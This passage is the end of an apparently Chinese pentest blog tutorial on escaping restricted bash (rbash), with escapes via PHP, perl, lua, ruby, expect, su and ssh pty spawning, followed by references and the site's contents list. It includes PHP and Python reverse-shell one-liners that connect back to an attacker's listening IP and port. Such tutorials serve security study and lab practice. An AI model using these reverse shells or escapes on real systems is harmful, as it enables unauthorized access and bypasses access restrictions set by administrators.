<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">攻击机开启监听``nc -lvp PORT``目标机建立连接``php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;IP&quot;,PORT);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure>
<h4 id="3、perl"><a href="#3、perl" class="headerlink" title="3、perl"></a>3、perl</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927214552077.png'><img src="image-20230927214552077.png" alt="image-20230927214552077"></p>
<h4 id="4、lua"><a href="#4、lua" class="headerlink" title="4、lua"></a>4、lua</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">os.execute(&#x27;/bin/sh&#x27;)<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927214652108.png'><img src="image-20230927214652108.png" alt="image-20230927214652108"></p>
<p>同PHP。。。估计真是语法问题？</p>
<h4 id="5、ruby"><a href="#5、ruby" class="headerlink" title="5、ruby"></a>5、ruby</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">exec &quot;/bin/sh&quot;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927214724097.png'><img src="image-20230927214724097.png" alt="image-20230927214724097"></p>
<h4 id="6、expect"><a href="#6、expect" class="headerlink" title="6、expect"></a>6、expect</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">spwan sh<br>sh<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230927214742434.png'><img src="image-20230927214742434.png" alt="image-20230927214742434"></p>
<h1>0x08 tips:</h1>
<p>8.1 比rbash更容易遇到的问题是当前路径异常问题</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>  <span class="hljs-comment">###一般很多命令基础执行不了的时候，都是路径异常，查看该值可验证    </span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   <span class="hljs-comment">####修复</span><br></code></pre></td></tr></table></figure>
<p>8.2 不能使用 &gt; ，&gt;&gt;等字符重定向写文件：echo ‘script code’ | tee scriptfile</p>
<p>8.3 su切换用户逃逸时还可以在切换用户时执行spawn shell命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su -c <span class="hljs-string">&quot;python -c  &#x27;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&#x27;&quot;</span> test1<br></code></pre></td></tr></table></figure>
<p>8.4 ssh 登录时同样可以通过spawn shell逃逸</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh username@IP  <span class="hljs-string">&quot;export TERM=xterm;python -c  &#x27;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
<p>8.5 编程语言绕过的利用，还可以使用反弹shell到我们攻击机的方式进行逃逸，以python为例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import       socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;LISTENING IP&quot;,LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure>
<p>8.6 上边用的比较多的是 !/bin/sh 和 !/bin/bash;其实还有一个 !‘sh’ —&gt;由于没有了 ‘/’ ；有时候能够达到很好的绕过效果</p>
<p class='item-img' data-src='image-20230927215051670.png'><img src="image-20230927215051670.png" alt="image-20230927215051670"></p>
<p>8.7 同理在路径正确的情况下，在当前rbash中直接输入 sh 也能够完成逃逸( !/bin/sh 和 !/bin/bash 逃逸失败报错同[6] )</p>
<p class='item-img' data-src='image-20230927215130750.png'><img src="image-20230927215130750.png" alt="image-20230927215130750"></p>
<h1>0x09 总结</h1>
<p>这次也就是简单的演示了一下各种情况，毕竟环境配置也很难很烦，因此就草草了事，只需要记得有这些姿势即可，在实战时遇到问题在对应解决。</p>
<p>上述这些逃逸方式应用到其他类型的restricted shell中也是可以的，由于不同系统特性不同，逃逸的方式也有很大差异；再就是用户限制的宽松程度不同，我们能够逃逸的方式也不同；用户安装的git、tar、zip等应用也能够给予很大的帮助；总之就是要多尝试，灵活应用！！！</p>
<h1>0x10 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_25924971/article/details/128884687">【安全】Linux Restricted Shell 绕过指南</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kuaile1314/p/12246116.html">[渗透技巧——如何逃逸Linux的受限制shell执行任意命令 ]</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43168364/article/details/111830233">【渗透测试】— rbash逃逸方法简述</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7642">rbash逃逸大全</a></p>
<p><a target="_blank" rel="noopener" href="https://posts.careerengine.us/p/623c361911387a6b1ddc861f">Restricted Bash绕过技巧</a>  --建立rbash环境可参考</p>
<p><a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/79f9d1ae819819834577891fd">DC 系列靶机知识点总结</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/01/%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-SSRF%20Me/">← 下一篇 题目名称-SSRF Me</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/25/Windows%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0%E4%BA%8C/">权限提升学习 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 rbash简述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFrbash"><span class="toc-number">2.1.</span> <span class="toc-text">1、什么是rbash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%AArbash"><span class="toc-number">2.2.</span> <span class="toc-text">2、如何设置一个rbash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">2.3.</span> <span class="toc-text">3、使用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 常用逃逸命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E5%A6%82%E6%9E%9C%E5%85%81%E8%AE%B8%E4%BD%BF%E7%94%A8%E2%80%9C-%E2%80%9D"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 如果允许使用“&#x2F;”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%A6%82%E6%9E%9C%E5%85%81%E8%AE%B8%E4%BD%BF%E7%94%A8cp%E5%91%BD%E4%BB%A4"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 如果允许使用cp命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E4%BD%BF%E7%94%A8ftp%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 使用ftp进行命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E4%BD%BF%E7%94%A8gdb%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 使用gdb进行命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-%E4%BD%BF%E7%94%A8more-man-less%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 使用more&#x2F;man&#x2F;less进行命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6-%E4%BD%BF%E7%94%A8vim%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.6.</span> <span class="toc-text">4.6 使用vim进行命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-7-%E4%BD%BF%E7%94%A8rvim%E6%89%A7%E8%A1%8Cpython"><span class="toc-number">4.7.</span> <span class="toc-text">4.7 使用rvim执行python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-8-%E4%BD%BF%E7%94%A8scp%E4%BC%A0%E5%85%A5%E8%87%AA%E5%B7%B1%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">4.8.</span> <span class="toc-text">4.8 使用scp传入自己的脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-9-%E4%BD%BF%E7%94%A8awk%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.9.</span> <span class="toc-text">4.9 使用awk命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-10-%E4%BD%BF%E7%94%A8find%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">4.10.</span> <span class="toc-text">4.10 使用find执行命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-11-%E8%A1%A5%E5%85%85"><span class="toc-number">4.11.</span> <span class="toc-text">4.11 补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81cp-bin-bash%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7%E7%9B%AE%E5%BD%95"><span class="toc-number">4.11.1.</span> <span class="toc-text">1、cp &#x2F;bin&#x2F;bash到本地用户目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81set-shell"><span class="toc-number">4.11.2.</span> <span class="toc-text">2、set shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%9B%B4%E6%94%B9PATH%E6%88%96SHELL%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">4.11.3.</span> <span class="toc-text">3、更改PATH或SHELL环境变量</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 编程语言逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-Python"><span class="toc-number">5.1.</span> <span class="toc-text">5.1 Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-PHP"><span class="toc-number">5.2.</span> <span class="toc-text">5.2 PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-perl"><span class="toc-number">5.3.</span> <span class="toc-text">5.3 perl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4-lua"><span class="toc-number">5.4.</span> <span class="toc-text">5.4 lua</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-5-Ruby"><span class="toc-number">5.5.</span> <span class="toc-text">5.5 Ruby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-6-except"><span class="toc-number">5.6.</span> <span class="toc-text">5.6 except</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x06 高级技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#6-1-ssh"><span class="toc-number">6.1.</span> <span class="toc-text">6.1 ssh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-2-zip"><span class="toc-number">6.2.</span> <span class="toc-text">6.2 zip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-3-tar"><span class="toc-number">6.3.</span> <span class="toc-text">6.3 tar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-4-pico"><span class="toc-number">6.4.</span> <span class="toc-text">6.4 pico</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-5-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%BF%AE%E5%A4%8D"><span class="toc-number">6.5.</span> <span class="toc-text">6.5 环境变量修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">0x07 简单实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-1-%E5%88%9B%E5%BB%BA%E6%B5%8B%E8%AF%95%E7%94%A8%E6%88%B7"><span class="toc-number">7.1.</span> <span class="toc-text">7.1 创建测试用户</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-1-%E4%B8%BA%E6%96%B0%E7%94%A8%E6%88%B7%E5%BB%BA%E7%AB%8B%E7%9B%AE%E5%BD%95"><span class="toc-number">7.1.1.</span> <span class="toc-text">7.1.1 为新用户建立目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1-2-%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E5%8F%AF%E4%BB%A5%E8%BF%90%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">7.1.2.</span> <span class="toc-text">7.1.2 指定用户可以运行的命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2-rbash%E9%80%83%E9%80%B8"><span class="toc-number">7.2.</span> <span class="toc-text">7.2 rbash逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-1-%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7%E6%97%B6%E9%80%83%E9%80%B8"><span class="toc-number">7.2.1.</span> <span class="toc-text">7.2.1 切换用户时逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-2-ssh%E7%99%BB%E5%BD%95%E6%97%B6%E9%80%83%E9%80%B8"><span class="toc-number">7.2.2.</span> <span class="toc-text">7.2.2 ssh登录时逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-3-%E5%BD%93%E5%89%8Dshell%E4%B8%AD%E9%80%83%E9%80%B8"><span class="toc-number">7.2.3.</span> <span class="toc-text">7.2.3 当前shell中逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-2-3-1-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5"><span class="toc-number">7.2.3.1.</span> <span class="toc-text">7.2.3.1 特殊情况</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-4-%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E9%80%83%E9%80%B8"><span class="toc-number">7.2.4.</span> <span class="toc-text">7.2.4 利用系统常见应用逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-5-%E5%88%A9%E7%94%A8%E7%94%A8%E6%88%B7%E5%AE%89%E8%A3%85%E5%BA%94%E7%94%A8%E9%80%83%E9%80%B8"><span class="toc-number">7.2.5.</span> <span class="toc-text">7.2.5 利用用户安装应用逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81ed-editor"><span class="toc-number">7.2.5.1.</span> <span class="toc-text">1、ed-editor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81git"><span class="toc-number">7.2.5.2.</span> <span class="toc-text">2、git</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81zip"><span class="toc-number">7.2.5.3.</span> <span class="toc-text">3、zip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81tar"><span class="toc-number">7.2.5.4.</span> <span class="toc-text">4、tar</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2-6-%E5%88%A9%E7%94%A8%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83%E7%BB%95%E8%BF%87"><span class="toc-number">7.2.6.</span> <span class="toc-text">7.2.6 利用编程语言环境绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81python"><span class="toc-number">7.2.6.1.</span> <span class="toc-text">1、python</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81php"><span class="toc-number">7.2.6.2.</span> <span class="toc-text">2、php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81perl"><span class="toc-number">7.2.6.3.</span> <span class="toc-text">3、perl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81lua"><span class="toc-number">7.2.6.4.</span> <span class="toc-text">4、lua</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81ruby"><span class="toc-number">7.2.6.5.</span> <span class="toc-text">5、ruby</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81expect"><span class="toc-number">7.2.6.6.</span> <span class="toc-text">6、expect</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">0x08 tips:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">0x09 总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">0x10 参考文章</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>